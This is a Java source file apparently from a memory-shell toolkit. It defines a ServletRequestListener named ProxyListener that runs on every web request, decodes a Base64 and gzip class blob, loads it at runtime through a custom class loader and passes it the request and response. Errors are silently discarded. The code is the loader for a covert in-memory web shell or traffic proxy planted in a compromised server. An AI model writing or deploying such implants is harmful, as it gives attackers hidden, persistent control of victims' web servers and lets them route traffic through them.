package com.reajason.javaweb.memshell.shelltool.proxy;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

public class ProxyListener extends ClassLoader implements ServletRequestListener {
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;

    public ProxyListener() {
    }

    protected ProxyListener(ClassLoader parent) {
        super(parent);
    }

    @Override
    public void requestInitialized(ServletRequestEvent event) {
        Object request = event.getServletRequest();
        try {
            Object response = getResponseFromRequest(request);
            getProxyHttpClass().newInstance().equals(new Object[]{request, response});
        } catch (Throwable ignored) {
        }
    }

    private Object getResponseFromRequest(Object request) throws Exception {
        return null;
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyListener.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = new ProxyListener(Thread.currentThread().getContextClassLoader())
                            .defineClass(bytes, 0, bytes.length);
                }
            }
        }
        return proxyHttpClass;
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Throwable e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent event) {
    }
}
